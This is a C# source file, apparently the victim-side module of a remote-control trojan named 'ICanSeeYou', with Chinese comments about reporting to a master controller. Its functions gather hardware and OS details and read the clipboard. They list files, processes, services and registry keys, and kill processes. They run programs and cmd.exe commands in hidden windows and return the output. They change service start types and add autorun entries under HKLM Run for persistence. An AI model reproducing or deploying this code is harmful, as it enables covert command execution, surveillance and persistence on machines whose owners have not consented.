using System;
using System.Collections.Generic;
using System.Text;
using Microsoft.Win32;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using System.ServiceProcess;
using System.Collections;
using System.Text.RegularExpressions;
namespace ICanSeeYou.Windows
{


    //首先定义一个全局，上线地址，上线端口等
   public  class BD
    {
        public static String LocalDisk_List = "";                     //电脑盘符命令，初始化命令头 
        public static String Online_Order = "";                     //上线命令，初始化命令头部 
        public static String Folder_List = "";                  //列举子文件夹命令，初始化命令头 
        public static String File_List = "";                    //列举文件命令，初始化命令头 
        public static String Process_List = "";                 //列举文件命令，初始化命令头 
        public static String RegName_List = "";            //列举注册表子项名命令，初始化命令头 
        public static String RegNameValues_List = "";      //列举注册表子项值命令，初始化命令头 
        public static String CMD_List = "";                  //保存DOS命令执行后的结果 
        public static String Service_List = "";                 //保存系统服务列表 
        public static Process CMD = new Process();                                 //用于执行DOS命令 
        public static bool _IsStop_Catching_Desktop = false;                       //此标识为用于判断是否停止对于屏幕的获取 
      

        /// <summary> 
        /// 此方法通过Windows WMI 服务 
        /// 进行计算机硬件软件信息的收集 
        /// </summary> 
        public static string  Get_ComputerInfo()
        {
            //查询计算机名 
            Online_Order += System.Environment.NewLine;
            Online_Order += WMI_Searcher("SELECT * FROM Win32_ComputerSystem", "Caption") + System .Environment .NewLine ;
            //查询操作系统 
            Online_Order += WMI_Searcher("SELECT * FROM Win32_OperatingSystem", "Caption") + System .Environment .NewLine ;
            //查询CPU 
            Online_Order += WMI_Searcher("SELECT * FROM Win32_Processor", "Caption") + System .Environment .NewLine ;
            //查询内存容量 - 单位: MB 
            Online_Order += (int.Parse(WMI_Searcher("SELECT * FROM Win32_OperatingSystem", "TotalVisibleMemorySize")) / 1024) + " MB"+System .Environment .NewLine ;
            return Online_Order;
        }
        /// <summary>
        /// 发送文本到剪贴板
        /// </summary>
        /// <param name="str"></param>
        public static void SendToClipboard(string str)
        { Clipboard.SetText(str); }
       /// <summary>
       /// 从剪贴板获取文本
       /// </summary>
       /// <returns></returns>
        public static string ReadFromClipboard()
        {
          
            IDataObject iData = Clipboard.GetDataObject();
            if (iData.GetDataPresent(DataFormats.Text))
            {
                return (string)iData.GetData(DataFormats.Text);
            }
            else
                return "";

        }
        /// <summary>
        /// 运行exe、bat、vbs文件
        /// </summary>
        /// <param name="filepath"></param>
        /// <param name="WaitOver"></param>
        /// <param name="parameter"></param>
        /// <returns></returns>
        public static string RunExeFile(string filepath, bool WaitOver,string parameter)
        {
            try
            {
                System.Diagnostics.Process exep = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.FileName = filepath;
                startInfo.Arguments = parameter;
                startInfo.CreateNoWindow = true;
                startInfo.UseShellExecute = false;
                exep.StartInfo = startInfo;
                exep.Start();
                if (WaitOver) exep.WaitForExit();//关键，等待外部程序退出后才能往下执行
                return "执行成功";
            }
            catch { return "执行失败"; }
        }

        #region WMI 操作相关及扩展

        /// <summary> 
        /// 此方法根据指定语句通过WMI查询用户指定内容 
        /// 并且返回 
        /// </summary> 
        /// <param name="QueryString"></param> 
        /// <param name="Item_Name"></param> 
        /// <returns></returns> 
        public static String WMI_Searcher(String QueryString, String Item_Name)
        {
            String Result = "";
            ManagementObjectSearcher MOS = new ManagementObjectSearcher(QueryString);
            ManagementObjectCollection MOC = MOS.Get();
            foreach (ManagementObject MOB in MOC)
            {
                Result = MOB[Item_Name].ToString();
                break;
            }
            MOC.Dispose();
            MOS.Dispose();
            return Result;
        }
        /// <summary>
        /// 重载
        /// </summary>
        /// <param name="QueryString"></param>
        /// <returns></returns>
        public static String WMI_Searcher(String  QueryString)
        {
            string Result = "";
            ManagementObjectSearcher MOS = new ManagementObjectSearcher(QueryString);
            ManagementObjectCollection MOC = MOS.Get();
            foreach (ManagementObject MOB in MOC)
            {
                foreach (PropertyData prop in MOB.Properties)
                {
                    Result += prop.Name + ":";
                    Result += MOB[prop.Name].ToString() + ",";
                }
                Result += "|";
            }
            MOC.Dispose();
            MOS.Dispose();
            return Result;
        }
        
        #endregion

  

        #region 枚举硬盘 

        /// <summary> 
        /// 此方法调用Windows WMI 
        /// 列举当前电脑所有盘符 
        /// </summary> 
        public static string  Get_LocalDisk()
        {
            LocalDisk_List = "$GetDir||";
            ManagementObjectSearcher MOS = new ManagementObjectSearcher("SELECT * FROM Win32_LogicalDisk");
            ManagementObjectCollection MOC = MOS.Get();
            foreach (ManagementObject MOB in MOC)
            {
                LocalDisk_List += MOB["Description"].ToString() + "#" + MOB["Caption"].ToString() + ",";
            }
            MOC.Dispose();
            MOS.Dispose();
            return LocalDisk_List;
           
        }

        #endregion

        #region 文件夹 - 文件枚举操作

        /// <summary> 
        /// 此方法用于根据指定盘符列举子文件夹 
        /// </summary> 
        /// <param name="Path"></param> 
        public static string  Get_Foloder(String Path)
        {
            Folder_List = "$GetFolder||";
            //得到指定盘符的所有子文件夹 
            String[] Folder = Directory.GetDirectories(Path);
            for (int i = 0; i < Folder.Length; i++)
            {
                Folder_List += Folder[i] + ",";
            }
            return Folder_List;
            
        }

        /// <summary> 
        /// 此方法用于根据指定盘符列举子所有文件 
        /// </summary> 
        /// <param name="Path"></param> 
        public static string  Get_File(String Path)
        {
            File_List = "$GetFile||";
            //得到文件目标文件夹文件数组 
            String[] Result_List = Directory.GetFiles(Path);
            //通过拆分得到结果字符串 
            for (int i = 0; i < Result_List.Length; i++)
            {
                File_List += Result_List[i] + ",";
            }

            return File_List;
        }

        #endregion

       

      

        #region 系统进程相关操作

        /// <summary> 
        /// 此方法负责列举当前系统所有进程 
        /// 并且拼接结果字符串发送给主控端 
        /// </summary> 
        public static string  Get_Process()
        {
            Process_List = "";
            Process[] process = Process.GetProcesses();
            for (int i = 0; i < process.Length; i++)
            {
                try
                {
                    if (process[i].ProcessName != "")
                    {
                        //拼接字符串 
                        Process_List += process[i].Id .ToString () + "," + process[i].ProcessName  + "," + process[i].Handle .ToString () + ","+process [i].MainModule .FileName +","+process[i].StartTime .ToString ()+"|";
                    }
                }
                catch (Exception ex)
                { };

            }
            return Process_List;
            
        }

        /// <summary> 
        /// 此方法根据指定的进程名杀死进程 
        /// 如果结束进程成功 则返回 $KillProcess||True 
        /// 否则返回 $KillProcess||False 
        /// </summary> 
        /// <param name="Process_Name"></param> 
        public static bool   Kill_Process(String Process_Name)
        {
            bool isKilled = false;
            Process[] Process_Set = Process.GetProcesses();
            //遍历所有进程，找到指定进程后杀死 
            for (int i = 0; i < Process_Set.Length; i++)
            {
                try
                {
                    if (Process_Set[i].ProcessName == Process_Name)
                    {
                        //如果找到进程则尝试杀死该进程 
                        Process_Set[i].Kill();
                        //杀死成功后 ，改变标志位，跳出FOR循环发送回应命令 
                        isKilled = true;
                        break;
                    }
                }
                catch (Exception ex)
                { };
            }

            //得到结果后判断标志位 
            if (isKilled)
            {
                return true;
            }
            else
            {
                return false ;
            }
        }

        #endregion

        #region 注册表操作相关

        /// <summary> 
        /// 此方法用于得到当前系统注册表根目录名字并且发送 
        /// </summary> 
        public static string  Get_RegRoot(String Key_Model, String Key_Path)
        {
            RegName_List = "";
            //新建数组结构体用来接收得到的子项名集合 
            String[] Reg_Name_Set = Get_Register_Root_Names(Key_Model, Key_Path);
            for (int i = 0; i < Reg_Name_Set.Length; i++)
            {
                //拼接结果字符串 
                RegName_List += Reg_Name_Set[i] + "|";
            }
            return RegName_List;
        }

        /// <summary> 
        /// 此方法根据指定的注册表项路径 
        /// 查找所属下的所有子项名称 
        /// 并且返回数组名称结构体 
        /// </summary> 
        /// <param name="Key_Model"></param> 
        /// <param name="Key_Path"></param> 
        /// <returns></returns> 
        public static String[] Get_Register_Root_Names(String Key_Model, String Key_Path)
        {
            //新建数组，用来储存子项名字集合 
            String[] Names = null;
            //如果是检索根键值 
            if (Key_Path == "")
            {
                //判断键值路径所属的根键 
                switch (Key_Model)
                {
                    //如果是HKEY_CLASSES_ROOT下面的 
                    case "HKEY_CLASSES_ROOT":
                        Names = Registry.ClassesRoot.GetSubKeyNames();
                        break;
                    //如果是HKEY_CURRENT_CONFIG下面的 
                    case "HKEY_CURRENT_CONFIG":
                        Names = Registry.CurrentConfig.GetSubKeyNames();
                        break;
                    //如果是HKEY_CURRENT_USER下面的 
                    case "HKEY_CURRENT_USER":
                        Names = Registry.CurrentUser.GetSubKeyNames();
                        break;
                    //如果是HKEY_LOCAL_MACHINE下面的 
                    case "HKEY_LOCAL_MACHINE":
                        Names = Registry.LocalMachine.GetSubKeyNames();
                        break;
                    //如果是HKEY_USERS下面的 
                    case "HKEY_USERS":
                        Names = Registry.Users.GetSubKeyNames();
                        break;
                }
            }
            //如果是检索根键值下面的子项 
            else
            {
                //去除Key_Path首位的\\，如果有
                while (Key_Path.IndexOf("\\") == 0) Key_Path = Key_Path.Remove(0, 1);
                //判断键值路径所属的根键 
                switch (Key_Model)
                {
                    //如果是HKEY_CLASSES_ROOT下面的 
                    case "HKEY_CLASSES_ROOT":
                        Names = Registry.ClassesRoot.OpenSubKey(Key_Path).GetSubKeyNames();
                        break;
                    //如果是HKEY_CURRENT_CONFIG下面的 
                    case "HKEY_CURRENT_CONFIG":
                        Names = Registry.CurrentConfig.OpenSubKey(Key_Path).GetSubKeyNames();
                        break;
                    //如果是HKEY_CURRENT_USER下面的 
                    case "HKEY_CURRENT_USER":
                        Names = Registry.CurrentUser.OpenSubKey(Key_Path).GetSubKeyNames();
                        break;
                    //如果是HKEY_LOCAL_MACHINE下面的 
                    case "HKEY_LOCAL_MACHINE":
                        Names = Registry.LocalMachine.OpenSubKey(Key_Path).GetSubKeyNames();
                        break;
                    //如果是HKEY_USERS下面的 
                    case "HKEY_USERS":
                        Names = Registry.Users.OpenSubKey(Key_Path).GetSubKeyNames();
                        break;
                }
            }

            //返回目录名集合 包含除根目录外的全路径，如path1\path2\path3形式
            for (int i = 0; i < Names.Length; i++) Names[i] = Key_Path + "\\" + Names[i];
            return Names;
        }
       
        /// <summary> 
        /// 此方法根据指定的注册表项路径 
        /// 查找所属下的所有值名称 
        /// 并且返回数组名称结构体 ,格式为字段名##字段值
        /// </summary> 
        /// <param name="Key_Model"></param> 
        /// <param name="Key_Path"></param> 
        /// <returns></returns> 
        public static String[] Get_Register_Root_Values(String Key_Model, String Key_Path)
        {
            //新建数组，用来储存子项名字集合 
            String Result_List = "";
            //如果是检索根键值 
            if (Key_Path == "")
            {
                //判断键值路径所属的根键 
                switch (Key_Model)
                {
                    //如果是HKEY_CLASSES_ROOT下面的 
                    case "HKEY_CLASSES_ROOT":
                        using (RegistryKey RK = Registry.ClassesRoot)
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                            }
                        }
                        break;
                    //如果是HKEY_CURRENT_CONFIG下面的 
                    case "HKEY_CURRENT_CONFIG":
                        using (RegistryKey RK = Registry.CurrentConfig)
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                            }
                        }
                        break;
                    //如果是HKEY_CURRENT_USER下面的 
                    case "HKEY_CURRENT_USER":
                        using (RegistryKey RK = Registry.CurrentUser)
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                            }
                        }
                        break;
                    //如果是HKEY_LOCAL_MACHINE下面的 
                    case "HKEY_LOCAL_MACHINE":
                        using (RegistryKey RK = Registry.LocalMachine)
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                            }
                        }
                        break;
                    //如果是HKEY_USERS下面的 
                    case "HKEY_USERS":
                        using (RegistryKey RK = Registry.Users)
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                            }
                        }
                        break;
                }
            }
            //如果是检索根键值下面的子项 
            else
            {
                //去除Key_Path首位的\\，如果有
                while (Key_Path.IndexOf("\\") == 0) Key_Path = Key_Path.Remove(0, 1);
                //判断键值路径所属的根键 
                switch (Key_Model)
                {
                    //如果是HKEY_CLASSES_ROOT下面的 
                    case "HKEY_CLASSES_ROOT":
                        using (RegistryKey RK = Registry.ClassesRoot.OpenSubKey(Key_Path))
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                            }
                        }
                        break;
                    //如果是HKEY_CURRENT_CONFIG下面的 
                    case "HKEY_CURRENT_CONFIG":
                        using (RegistryKey RK = Registry.CurrentConfig.OpenSubKey(Key_Path))
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                            }
                        }
                        break;
                    //如果是HKEY_CURRENT_USER下面的 
                    case "HKEY_CURRENT_USER":
                        using (RegistryKey RK = Registry.CurrentUser.OpenSubKey(Key_Path))
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                            }
                        }
                        break;
                    //如果是HKEY_LOCAL_MACHINE下面的 
                    case "HKEY_LOCAL_MACHINE":
                        using (RegistryKey RK = Registry.LocalMachine.OpenSubKey(Key_Path))
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                            }
                        }
                        break;
                    //如果是HKEY_USERS下面的 
                    case "HKEY_USERS":
                        using (RegistryKey RK = Registry.Users.OpenSubKey(Key_Path))
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "#" + RK.GetValue(VName).ToString() + "|";
                            }
                        }
                        break;
                }
            }

            //返回目录名集合 
            return Result_List.Split('|');
        }
        public static string [] Get_Register_Root_ALLValues(String Key_Model, String Key_Path)
        {
            //新建数组，用来储存子项名字集合 
            String Result_List = "";
            //如果是检索根键值 
            if (Key_Path == "")
            {
                //判断键值路径所属的根键 
                switch (Key_Model)
                {
                    //如果是HKEY_CLASSES_ROOT下面的 
                    case "HKEY_CLASSES_ROOT":
                        using (RegistryKey RK = Registry.ClassesRoot)
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "####" + RK.GetValue(VName).ToString() + "||||";
                            }
                        }
                        break;
                    //如果是HKEY_CURRENT_CONFIG下面的 
                    case "HKEY_CURRENT_CONFIG":
                        using (RegistryKey RK = Registry.CurrentConfig)
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "####" +RK.GetValueKind(VName ) .ToString ()+"####"+ RK.GetValue(VName).ToString() + "||||";
                            }
                        }
                        break;
                    //如果是HKEY_CURRENT_USER下面的 
                    case "HKEY_CURRENT_USER":
                        using (RegistryKey RK = Registry.CurrentUser)
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "####" + RK.GetValueKind(VName).ToString() + "####" + RK.GetValue(VName).ToString() + "||||";
                            }
                        }
                        break;
                    //如果是HKEY_LOCAL_MACHINE下面的 
                    case "HKEY_LOCAL_MACHINE":
                        using (RegistryKey RK = Registry.LocalMachine)
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "####" + RK.GetValueKind(VName).ToString() + "####" + RK.GetValue(VName).ToString() + "||||";
                            }
                        }
                        break;
                    //如果是HKEY_USERS下面的 
                    case "HKEY_USERS":
                        using (RegistryKey RK = Registry.Users)
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "####" + RK.GetValueKind(VName).ToString() + "####" + RK.GetValue(VName).ToString() + "||||";
                            }
                        }
                        break;
                }
            }
            //如果是检索根键值下面的子项 
            else
            {
                //去除Key_Path首位的\\，如果有
                while (Key_Path.IndexOf("\\") == 0) Key_Path = Key_Path.Remove(0, 1);
                //判断键值路径所属的根键 
                switch (Key_Model)
                {
                    //如果是HKEY_CLASSES_ROOT下面的 
                    case "HKEY_CLASSES_ROOT":
                        using (RegistryKey RK = Registry.ClassesRoot.OpenSubKey(Key_Path))
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "####" + RK.GetValueKind(VName).ToString() + "####" + RK.GetValue(VName).ToString() + "||||";
                            }
                        }
                        break;
                    //如果是HKEY_CURRENT_CONFIG下面的 
                    case "HKEY_CURRENT_CONFIG":
                        using (RegistryKey RK = Registry.CurrentConfig.OpenSubKey(Key_Path))
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "####" + RK.GetValueKind(VName).ToString() + "####" + RK.GetValue(VName).ToString() + "||||";
                            }
                        }
                        break;
                    //如果是HKEY_CURRENT_USER下面的 
                    case "HKEY_CURRENT_USER":
                        using (RegistryKey RK = Registry.CurrentUser.OpenSubKey(Key_Path))
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "####" + RK.GetValueKind(VName).ToString() + "####" + RK.GetValue(VName).ToString() + "||||";
                            }
                        }
                        break;
                    //如果是HKEY_LOCAL_MACHINE下面的 
                    case "HKEY_LOCAL_MACHINE":
                        using (RegistryKey RK = Registry.LocalMachine.OpenSubKey(Key_Path))
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "####" + RK.GetValueKind(VName).ToString() + "####" + RK.GetValue(VName).ToString() + "||||";
                            }
                        }
                        break;
                    //如果是HKEY_USERS下面的 
                    case "HKEY_USERS":
                        using (RegistryKey RK = Registry.Users.OpenSubKey(Key_Path))
                        {
                            foreach (String VName in RK.GetValueNames())
                            {
                                Result_List += VName + "####" + RK.GetValueKind(VName).ToString() + "####" + RK.GetValue(VName).ToString() + "||||";
                            }
                        }
                        break;
                }
            }

            //返回目录名集合 
            return Regex.Split(Result_List, "\\|\\|\\|\\|", RegexOptions.None);
        }
        #endregion

        #region 系统DOS相关操作

        /// <summary> 
        /// 此方法用于激活本地DOS 
        /// 首先查找是否存在DOS的可执行文件 
        /// 如果不存在则返回错误信息 
        /// 存在则返回DOS欢迎初始化信息 
        /// </summary> 
        public static bool   ActiveDos()
        {
            //如果不存在文件 
            if (!File.Exists(System.Environment.CurrentDirectory+"\\cmd.exe"))
            {
                return false;
            }
            //如果存在 
            else
            {
                return true;
               
            }
        }

        /// <summary> 
        /// 此方法用于获得执行命令后的结果 
        /// 并发送给主控端 
        /// </summary> 
        /// <param name="Order"></param> 
        public static string  Execute_Command(String Order)
        {
            return  "$ExecuteCommand||["+Order +"]"+System.Environment .NewLine +"-------------------------Start-------------------------"+System .Environment .NewLine  + Get_Message_Command("/c " + Order)+System .Environment .NewLine +"--------------------------End--------------------------"+ System.Environment .NewLine ;
           
        }


        /// <summary> 
        /// 此方法用于将指定DOS命令执行后返回结果 
        /// </summary> 
        /// <param name="Command"></param> 
        /// <returns></returns> 
        public static String Get_Message_Command(String Command)
        {
            CMD.StartInfo.FileName = "cmd.exe";
            CMD.StartInfo.Arguments = Command;
            CMD.StartInfo.RedirectStandardError = true;
            CMD.StartInfo.RedirectStandardOutput = true;
            CMD.StartInfo.UseShellExecute = false;
            CMD.StartInfo.CreateNoWindow = true;
            CMD.Start();
            String Message_Line = "";
            String Result = "";
            using (StreamReader Reader = CMD.StandardOutput)
            {
                //循环读取结果 
                while ((Message_Line = Reader.ReadLine()) != null)
                {
                    Result += Message_Line + "\n";
                }
            }
            return Result;

        }

        #endregion

        #region 系统服务相关操作

        /// <summary> 
        /// 此服务用于将得到的所有系统服务列表 
        /// 发送到主控端 
        /// </summary> 
        public static string  GetService()
        {
            return   Service_List + WMI_Searcher ("SELECT Name,DisplayName,Description,State,StartMode,Started,PathName,ProcessId FROM Win32_Service");
           
        }
        public static bool StopService(string servicename)
        {
            try
            {
                using (ServiceController control = new ServiceController(servicename))
                {
                    if (control.Status == System.ServiceProcess.ServiceControllerStatus.Running) control.Stop();
                    control.Refresh();
                }
                return true;
            }
            catch
            { return false; }
        }
        public static bool StartService(string servicename)
        {
            try
            {
                using (ServiceController control = new ServiceController(servicename))
                {
                    if (control.Status == System.ServiceProcess.ServiceControllerStatus.Stopped ) control.Start();
                    control.Refresh();
                }
                return true;
            }
            catch
            { return false; }
        }
        /// <summary>
        /// 设置服务启动类型，2自动，3手动，4禁用
        /// </summary>
        /// <param name="servicename"></param>
        /// <param name="i">2自动，3手动，4禁用</param>
        /// <returns></returns>
        public static bool ChangeStateService(string servicename, int i)
        {
            try
            {
                string keyPath = @"SYSTEM\CurrentControlSet\Services\" + servicename;
                RegistryKey key = Registry.LocalMachine.OpenSubKey(keyPath, true);
                int StartType = -1;
                if (Int32.TryParse(key.GetValue("Start").ToString(), out StartType))
                {
                    key.SetValue("Start", i);

                }
                return true;
            }
            catch { return false; }
        }
        /// <summary> 
        /// 开机启动项 
        /// </summary> 
        /// <param name=\"Started\">是否启动</param> 
        /// <param name=\"name\">启动值的名称</param> 
        /// <param name=\"path\">启动程序的路径</param> 
        public static void RunWhenStart(bool Started, string name, string path)
        {
            RegistryKey HKLM = Registry.LocalMachine;
            RegistryKey Run = HKLM.CreateSubKey(@"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"); 
          if (Started == true)
            {
                try
                {
                    Run.SetValue(name, path);
                    HKLM.Close();
                }
                catch 
                {
                   
                }
            }
            else
            {
                try
                {
                    Run.DeleteValue(name);
                    HKLM.Close();
                }
                catch (Exception)
                {
                    // 
                }
            }
        }
        public static string StartupInfoList()
        {
            string msg = "";
            string [] keys = BD.Get_Register_Root_Values("HKEY_LOCAL_MACHINE", @"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\");
            foreach (string key in keys) msg += key + "|";
            return msg;

        }
        #endregion

    }
}
